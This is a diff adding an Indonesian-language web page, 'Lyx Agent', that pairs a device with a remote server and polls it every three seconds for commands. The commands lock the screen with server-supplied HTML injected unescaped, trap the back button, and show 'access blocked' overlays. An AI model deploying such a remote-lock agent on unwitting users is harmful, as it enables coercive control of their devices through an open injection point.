@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Lyx Agent 😈</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
+  body {
+    background: radial-gradient(circle at top, #1a0033 0%, #0a0a0a 70%);
+    min-height: 100vh;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    overflow: hidden;
+  }
+  .container {
+    width: 100%;
+    max-width: 380px;
+    background: rgba(15,0,30,0.9);
+    border: 1px solid #6a00ff;
+    border-radius: 20px;
+    padding: 30px 22px;
+    box-shadow: 0 0 40px #6a00ff55, inset 0 0 20px #6a00ff22;
+    position: relative;
+    animation: fadeIn 0.6s ease;
+  }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
+
+  .logo {
+    text-align: center;
+    margin-bottom: 25px;
+  }
+  .logo-icon {
+    font-size: 55px;
+    display: inline-block;
+    filter: drop-shadow(0 0 15px #b266ff);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+  }
+  .logo h1 {
+    font-size: 22px;
+    margin-top: 8px;
+    background: linear-gradient(90deg, #b266ff, #ff00ff, #b266ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 3px;
+    font-weight: 900;
+  }
+  .logo p {
+    font-size: 11px;
+    color: #888;
+    margin-top: 4px;
+    letter-spacing: 1px;
+  }
+
+  .input-group { margin-bottom: 18px; }
+  .input-group label {
+    display: block;
+    font-size: 12px;
+    color: #c77dff;
+    margin-bottom: 8px;
+    letter-spacing: 1px;
+    font-weight: 600;
+  }
+  .input-group input {
+    width: 100%;
+    background: #0a0018;
+    border: 1px solid #6a00ff77;
+    border-radius: 12px;
+    padding: 15px;
+    color: #00ffcc;
+    font-size: 20px;
+    letter-spacing: 6px;
+    text-align: center;
+    font-family: 'Courier New', monospace;
+    font-weight: bold;
+    text-transform: uppercase;
+    transition: 0.25s;
+  }
+  .input-group input:focus {
+    outline: none;
+    border-color: #b266ff;
+    box-shadow: 0 0 20px #b266ff88;
+    background: #150030;
+  }
+  .input-group input::placeholder {
+    color: #444;
+    letter-spacing: 2px;
+    font-size: 14px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #6a00ff, #b300ff);
+    color: #fff;
+    font-size: 15px;
+    font-weight: bold;
+    letter-spacing: 2px;
+    cursor: pointer;
+    transition: 0.25s;
+    box-shadow: 0 0 20px #6a00ff66;
+    text-transform: uppercase;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px #b300ffaa; }
+  .btn:active { transform: scale(0.97); }
+  .btn:disabled {
+    background: #333;
+    box-shadow: none;
+    cursor: not-allowed;
+    transform: none;
+    opacity: 0.6;
+  }
+  .btn.green {
+    background: linear-gradient(135deg, #008844, #00cc66);
+    box-shadow: 0 0 20px #00cc6688;
+  }
+
+  .status {
+    margin-top: 18px;
+    padding: 12px;
+    border-radius: 10px;
+    font-size: 12px;
+    text-align: center;
+    display: none;
+    animation: fadeIn 0.3s;
+  }
+  .status.show { display: block; }
+  .status.info { background: rgba(0,100,255,0.15); border:1px solid #0066ff; color:#66aaff; }
+  .status.success { background: rgba(0,200,100,0.15); border:1px solid #00cc66; color:#00ff88; }
+  .status.error { background: rgba(200,0,50,0.15); border:1px solid #cc0033; color:#ff4477; }
+
+  .loading-dots::after {
+    content: '';
+    animation: dots 1.5s steps(4,end) infinite;
+  }
+  @keyframes dots {
+    0% { content: ''; }
+    25% { content: '.'; }
+    50% { content: '..'; }
+    75% { content: '...'; }
+  }
+
+  /* Halaman sukses */
+  .success-page {
+    display: none;
+    text-align: center;
+    animation: fadeIn 0.5s;
+  }
+  .success-page.active { display: block; }
+  .check-icon {
+    font-size: 70px;
+    color: #00ff88;
+    filter: drop-shadow(0 0 20px #00ff88);
+    animation: popIn 0.5s;
+  }
+  @keyframes popIn {
+    0% { transform: scale(0); }
+    70% { transform: scale(1.2); }
+    100% { transform: scale(1); }
+  }
+  .success-page h2 {
+    margin-top: 15px;
+    color: #00ff88;
+    font-size: 20px;
+    letter-spacing: 2px;
+  }
+  .success-page p {
+    color: #aaa;
+    font-size: 12px;
+    margin-top: 8px;
+    line-height: 1.6;
+  }
+  .device-info {
+    background: #0a0018;
+    border: 1px solid #00cc6666;
+    border-radius: 10px;
+    padding: 12px;
+    margin-top: 18px;
+    text-align: left;
+    font-size: 12px;
+  }
+  .device-info div { margin: 5px 0; color: #ccc; }
+  .device-info span { color: #00ffcc; font-weight: bold; }
+
+  .pulse-ring {
+    position: absolute;
+    top: 25px;
+    right: 25px;
+    width: 10px;
+    height: 10px;
+    background: #00ff88;
+    border-radius: 50%;
+    box-shadow: 0 0 10px #00ff88;
+    animation: ring 1.5s infinite;
+  }
+  @keyframes ring {
+    0% { box-shadow: 0 0 0 0 #00ff8888; }
+    100% { box-shadow: 0 0 0 15px #00ff8800; }
+  }
+</style>
+</head>
+<body>
+
+<div class="container" id="container">
+
+  <!-- ============ HALAMAN INPUT CODE ============ -->
+  <div id="inputPage">
+    <div class="logo">
+      <div class="logo-icon">😈</div>
+      <h1>LYX AGENT</h1>
+      <p>ZAMZZZ SYSTEM • AUTO CONNECT</p>
+    </div>
+
+    <div class="input-group">
+      <label>🔑 MASUKKAN CODE PAIRING</label>
+      <input type="text" id="codeInput" maxlength="8" placeholder="XXXXXXXX" autocomplete="off" spellcheck="false">
+    </div>
+
+    <button class="btn" id="connectBtn" onclick="connectDevice()">CONNECT</button>
+
+    <div class="status" id="status"></div>
+  </div>
+
+  <!-- ============ HALAMAN SUKSES ============ -->
+  <div class="success-page" id="successPage">
+    <div class="check-icon">✅</div>
+    <h2>TERHUBUNG!</h2>
+    <p>Perangkat berhasil terdaftar ke panel kontrol.</p>
+
+    <div class="device-info">
+      <div>📱 Nama: <span id="devName">-</span></div>
+      <div>🔧 Model: <span id="devModel">-</span></div>
+      <div>💻 OS: <span id="devOs">-</span></div>
+      <div>🆔 ID: <span id="devId">-</span></div>
+      <div>🟢 Status: <span>ONLINE</span></div>
+    </div>
+
+    <p style="margin-top:15px; font-size:11px; color:#666;">
+      Jangan tutup aplikasi ini. Agent berjalan di background.
+    </p>
+  </div>
+
+</div>
+
+<script>
+/* ==================== KONFIGURASI ==================== */
+const API_BASE = "https://lyx-server.up.railway.app"; // GANTI dengan URL Railway Tuan
+
+/* ==================== STATE ==================== */
+let deviceId = localStorage.getItem('lyx_device_id') || null;
+let isPolling = false;
+
+/* ==================== FORMAT INPUT ==================== */
+const codeInput = document.getElementById('codeInput');
+codeInput.addEventListener('input', (e) => {
+  e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+});
+
+codeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') connectDevice();
+});
+
+/* ==================== SHOW STATUS ==================== */
+function showStatus(msg, type = 'info') {
+  const s = document.getElementById('status');
+  s.textContent = msg;
+  s.className = 'status show ' + type;
+}
+
+/* ==================== AUTO CONNECT ==================== */
+async function connectDevice() {
+  const code = codeInput.value.trim().toUpperCase();
+  const btn = document.getElementById('connectBtn');
+
+  if (code.length !== 8) {
+    showStatus('Code harus 8 karakter!', 'error');
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'CONNECTING';
+  btn.classList.add('loading-dots');
+  showStatus('Menghubungkan ke server...', 'info');
+
+  // Deteksi info device
+  const deviceInfo = detectDevice();
+
+  try {
+    const res = await fetch(API_BASE + '/api/register-device', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        code: code,
+        name: deviceInfo.name,
+        model: deviceInfo.model,
+        os: deviceInfo.os,
+        type: deviceInfo.type
+      })
+    });
+
+    const data = await res.json();
+
+    if (!data.success) {
+      btn.disabled = false;
+      btn.textContent = 'CONNECT';
+      btn.classList.remove('loading-dots');
+      showStatus('❌ ' + (data.message || 'Code tidak valid'), 'error');
+      return;
+    }
+
+    // Simpan device ID
+    deviceId = data.deviceId;
+    localStorage.setItem('lyx_device_id', deviceId);
+    localStorage.setItem('lyx_device_name', deviceInfo.name);
+
+    // Tampilkan halaman sukses
+    showStatus('✅ Berhasil terhubung!', 'success');
+    setTimeout(() => {
+      document.getElementById('devName').textContent = deviceInfo.name;
+      document.getElementById('devModel').textContent = deviceInfo.model;
+      document.getElementById('devOs').textContent = deviceInfo.os;
+      document.getElementById('devId').textContent = deviceId.slice(-8);
+      document.getElementById('inputPage').style.display = 'none';
+      document.getElementById('successPage').classList.add('active');
+    }, 600);
+
+    // Mulai polling command
+    startPolling();
+
+  } catch (err) {
+    btn.disabled = false;
+    btn.textContent = 'CONNECT';
+    btn.classList.remove('loading-dots');
+    showStatus('❌ Server tidak terjangkau', 'error');
+  }
+}
+
+/* ==================== DETEKSI DEVICE ==================== */
+function detectDevice() {
+  const ua = navigator.userAgent;
+  let type = 'android';
+  let os = 'Unknown';
+  let model = 'Unknown';
+  let name = 'Perangkat';
+
+  if (/android/i.test(ua)) {
+    type = 'android';
+    const m = ua.match(/Android\s([\d.]+)/);
+    os = 'Android ' + (m ? m[1] : '');
+    const modelMatch = ua.match(/;\s([^;)]+)\sBuild/);
+    model = modelMatch ? modelMatch[1].trim() : 'Android Device';
+    name = model;
+  } else if (/iphone|ipad|ipod/i.test(ua)) {
+    type = 'ios';
+    const m = ua.match(/OS\s(\d+_\d+)/);
+    os = 'iOS ' + (m ? m[1].replace('_','.') : '');
+    model = 'Apple Device';
+    name = 'iPhone/iPad';
+  } else if (/windows/i.test(ua)) {
+    type = 'desktop';
+    os = 'Windows';
+    model = 'PC';
+    name = 'Windows PC';
+  } else if (/mac/i.test(ua)) {
+    type = 'desktop';
+    os = 'macOS';
+    model = 'Mac';
+    name = 'Mac Device';
+  } else if (/linux/i.test(ua)) {
+    type = 'desktop';
+    os = 'Linux';
+    model = 'Linux PC';
+    name = 'Linux Device';
+  }
+
+  return { name, model, os, type };
+}
+
+/* ==================== POLLING COMMAND ==================== */
+function startPolling() {
+  if (isPolling) return;
+  isPolling = true;
+  pollCommands();
+}
+
+async function pollCommands() {
+  if (!deviceId) return;
+
+  try {
+    const res = await fetch(API_BASE + '/api/agent/commands/' + deviceId);
+    const data = await res.json();
+
+    if (data.commands && data.commands.length > 0) {
+      for (const cmd of data.commands) {
+        executeCommand(cmd);
+      }
+    }
+  } catch (err) {
+    // Silent fail, coba lagi
+  }
+
+  // Polling tiap 3 detik
+  setTimeout(pollCommands, 3000);
+}
+
+/* ==================== EKSEKUSI COMMAND ==================== */
+function executeCommand(cmd) {
+  console.log('📥 Command diterima:', cmd);
+
+  switch (cmd.type) {
+    case 'lock':
+      applyLock(cmd.html);
+      break;
+
+    case 'unlock':
+      removeLock();
+      break;
+
+    case 'block-app':
+      applyBlockApp(cmd.appName, cmd.message);
+      break;
+
+    case 'unblock-app':
+      removeBlockApp(cmd.appName);
+      break;
+  }
+}
+
+/* ==================== LOCK SCREEN ==================== */
+function applyLock(html) {
+  // Hapus lock lama kalau ada
+  removeLock();
+
+  const lock = document.createElement('div');
+  lock.id = 'lyx-lock';
+  lock.style.cssText = `
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #000;
+    z-index: 999999;
+    overflow: auto;
+  `;
+  lock.innerHTML = html || '<h1 style="color:#ff0044;text-align:center;padding-top:100px;font-family:sans-serif;">🔒 Terkunci</h1>';
+
+  document.body.appendChild(lock);
+  document.body.style.overflow = 'hidden';
+
+  // Cegah back button
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', blockBack);
+}
+
+function removeLock() {
+  const lock = document.getElementById('lyx-lock');
+  if (lock) lock.remove();
+  document.body.style.overflow = '';
+  window.removeEventListener('popstate', blockBack);
+}
+
+function blockBack() {
+  history.pushState(null, '', location.href);
+}
+
+/* ==================== BLOKIR APLIKASI ==================== */
+const blockedApps = JSON.parse(localStorage.getItem('lyx_blocked_apps') || '{}');
+
+function applyBlockApp(appName, message) {
+  blockedApps[appName.toLowerCase()] = message;
+  localStorage.setItem('lyx_blocked_apps', JSON.stringify(blockedApps));
+  console.log('🚫 Aplikasi diblokir:', appName);
+
+  // Di web/app agent, kita bisa cek apakah app yang sedang dibuka termasuk diblokir
+  checkCurrentApp();
+}
+
+function removeBlockApp(appName) {
+  delete blockedApps[appName.toLowerCase()];
+  localStorage.setItem('lyx_blocked_apps', JSON.stringify(blockedApps));
+  console.log('✅ Blokir dilepas:', appName);
+}
+
+function checkCurrentApp() {
+  // Deteksi apakah halaman ini milik aplikasi tertentu
+  const currentApp = detectCurrentApp();
+  const blocked = blockedApps[currentApp.toLowerCase()];
+
+  if (blocked) {
+    showBlockOverlay(blocked);
+  }
+}
+
+function detectCurrentApp() {
+  // Bisa dikustomisasi sesuai kebutuhan
+  return document.title || 'unknown';
+}
+
+function showBlockOverlay(message) {
+  const existing = document.getElementById('lyx-block-overlay');
+  if (existing) return;
+
+  const overlay = document.createElement('div');
+  overlay.id = 'lyx-block-overlay';
+  overlay.style.cssText = `
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(0,0,0,0.95);
+    z-index: 999998;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    padding: 30px;
+    text-align: center;
+    font-family: sans-serif;
+  `;
+  overlay.innerHTML = `
+    <div style="font-size:70px; margin-bottom:20px;">🚫</div>
+    <h2 style="color:#ff0044; font-size:22px; margin-bottom:15px;">AKSES DIBLOKIR</h2>
+    <p style="color:#ccc; font-size:14px; line-height:1.6; max-width:300px;">${escapeHtml(message)}</p>
+  `;
+
+  document.body.appendChild(overlay);
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+/* ==================== AUTO RECONNECT ==================== */
+window.addEventListener('load', () => {
+  // Kalau device pernah terhubung, langsung mulai polling
+  if (deviceId) {
+    fetch(API_BASE + '/api/devices')
+      .then(r => r.json())
+      .then(devices => {
+        const exists = devices.find(d => d.id === deviceId);
+        if (exists) {
+          // Langsung masuk halaman sukses
+          document.getElementById('devName').textContent = exists.name;
+          document.getElementById('devModel').textContent = exists.model;
+          document.getElementById('devOs').textContent = exists.os;
+          document.getElementById('devId').textContent = deviceId.slice(-8);
+          document.getElementById('inputPage').style.display = 'none';
+          document.getElementById('successPage').classList.add('active');
+          startPolling();
+          checkCurrentApp();
+        } else {
+          // Device sudah tidak terdaftar, reset
+          localStorage.removeItem('lyx_device_id');
+          deviceId = null;
+        }
+      })
+      .catch(() => {});
+  }
+});
+</script>
+</body>
+</html>
